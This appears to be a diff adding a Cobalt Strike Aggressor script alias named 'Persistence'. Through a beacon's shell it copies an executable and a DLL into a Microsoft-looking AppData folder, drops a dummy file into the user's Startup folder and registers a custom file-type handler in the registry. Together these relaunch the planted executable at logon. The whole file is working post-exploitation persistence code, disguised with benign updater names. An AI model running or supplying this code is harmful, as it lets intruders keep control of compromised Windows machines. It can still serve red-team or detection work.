@@ -1,0 +1,16 @@
+alias Persistence {
+    $bid = $1;
+    
+    $cmd = "copy inno_updater.exe %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\inno_updater.exe";
+    bshell($bid, $cmd);
+    $cmd = "copy vcruntime140.dll %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\vcruntime140.dll";
+    bshell($bid, $cmd);
+    $cmd = "echo 123 > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.abcd\"";
+    bshell($bid, $cmd);
+    
+    $cmd = "reg add HKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command /ve /d \"%userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\inno_updater.exe\" /f";
+    bshell($bid, $cmd);
+    $cmd = "reg add HKEY_CURRENT_USER\\Software\\Classes\\.abcd\\OpenWithProgids /v abcdfile /t REG_NONE /d \"\" /f";
+    bshell($bid, $cmd);
+    
+}
